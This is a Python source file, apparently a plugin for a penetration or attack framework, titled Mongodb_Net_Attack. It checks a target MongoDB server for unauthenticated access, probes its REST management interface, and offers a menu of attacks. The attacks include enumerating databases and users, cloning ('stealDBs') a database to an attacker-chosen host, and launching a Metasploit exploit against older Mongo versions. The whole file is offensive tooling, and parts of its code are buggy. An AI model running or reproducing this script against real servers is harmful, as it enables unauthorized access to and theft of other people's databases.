# -*- coding: utf-8-*-
import json
class NSSPlugin:
    '''Mongodb_Net_Attack'''
    infos = [
        ['Plugin','Mongodb_Net_Attack'],
        ['Author','jadore'],
        ['Update','2014/07/22'],
        ['Site','http://www.jadore.wang'],
        ]
    opts  = [
        ['RHOST','localhost','Target IP'],
        ['RPORT','27017','Target Port'],
        ['LHOST','localhost','Local Mongodb/Shell IP'],
        ['LPORT','27017','Target Port'],
        ['PING',"false",'Enable/disable host pings'],
        ['PAYLOAD','false','Do Not Need Payload']
        ]
    def exploit(self):
        pp.prettyPrint("[+]DB Access attacks",GREEN)
        mgtOpen = False
        webOpen = False
        mgtSelect = True
        dbList = []

        target = RHOST
        port = int(RPORT)
        if PING.lower() == "false":
            ping = False
        else:
            ping = True
        
        pp.prettyPrint("Checking to see if credentials are needed...",GREEN)
        needCreds = exploitModule.accessCheck(target,port,ping)
        if needCreds[0] == 0:
            conn = pymongo.MongoClient(target,port)
            pp.prettyPrint("[*]Successful access with no credentials!",GREEN)
            mgtOpen = True
        elif needCreds[0] == 1:
            pp.prettyPrint("Login required...",YELLOW)
            srvUser = raw_input("Enter server username: ")
            srvPass = raw_input("Enter server password: ")
            uri = "mongodb://" + srvUser + ":" + srvPass + "@" + target + ":" + port +"/"
            try:
                conn = pymongo.MongoClient(target)
                pp.prettyPrint("MongoDB authenticated on " + target + ":" + port + "!",GREEN)
                mgtOpen = True
            except:
                raw_input("Failed to authenticate.  Press enter to continue...")
                return
        elif needCreds[0] == 2:
            conn = pymongo.MongoClient(target,port)
            pp.prettyPrint("Access check failure.  Testing will continue but will be unreliable.",GREEN)
            mgtOpen = True
        elif needCreds[0] == 3:
            pp.prettyPrint("Couldn't connect to Mongo server.",YELLOW)
            return

        mgtUrl = "http://" + target + ":28017"	
        #Future rev:  Add web management interface parsing
        try:
            mgtRespCode = urllib.urlopen(mgtUrl).getcode()
            if mgtRespCode == 200:
                pp.prettyPrint("MongoDB web management open at " + mgtUrl + ".  No authentication required!",GREEN)
                testRest = raw_input("Start tests for REST Interface (y/n)? ")
            if testRest.lower() == "y":
                restUrl = mgtUrl + "/listDatabases?text=1"
                restResp = urllib.urlopen(restUrl).read()
                restOn = restResp.find('REST is not enabled.')
                if restOn == -1:
                    pp.prettyPrint("REST interface enabled!",GREEN)
                    dbs = json.loads(restResp)
                    menuItem = 1
                    pp.prettyPrint("List of databases from REST API:",GREEN)
                    for x in range(0,len(dbs['databases'])):
                        dbTemp= dbs['databases'][x]['name']
                        pp.prettyPrint(str(menuItem) + "-" + dbTemp,GREEN)
                        menuItem += 1
                else:
                    pp.prettyPrint("REST interface not enabled.",YELLOW)
        except:		
            pp.prettyPrint("MongoDB web management closed or requires authentication.",YELLOW)
            
        if mgtOpen == True:
            while mgtSelect:
                pp.prettyPrint("\n",GREEN)
                pp.prettyPrint("1-Get Server Version and Platform",GREEN)
                pp.prettyPrint("2-Enumerate Databases/Collections/Users",GREEN)
                pp.prettyPrint("3-Check for GridFS",GREEN)
                pp.prettyPrint("4-Clone a Database",GREEN)
                pp.prettyPrint("5-Launch Metasploit Exploit for Mongo < 2.2.4",GREEN)
                pp.prettyPrint("6-Return to Main Menu",GREEN)
                attack = raw_input("Select an attack: ")
        
                if attack == "1":
                    print "\n"
                    exploitModule.getPlatInfo(conn)
                elif attack == "2":
                    print "\n"
                    exploitModule.enumDbs(conn)
                elif attack == "3":
                    print "\n"
                    exploitModule.enumGrid(conn)
                elif attack == "4":
                    print "\n"
                    exploitModule.stealDBs(LHOST,LPORT,target,conn)
                elif attack == "5":
                    print "\n"
                    exploitModule.msfLaunch(target,LHOST,LPORT)
                else:
                    return
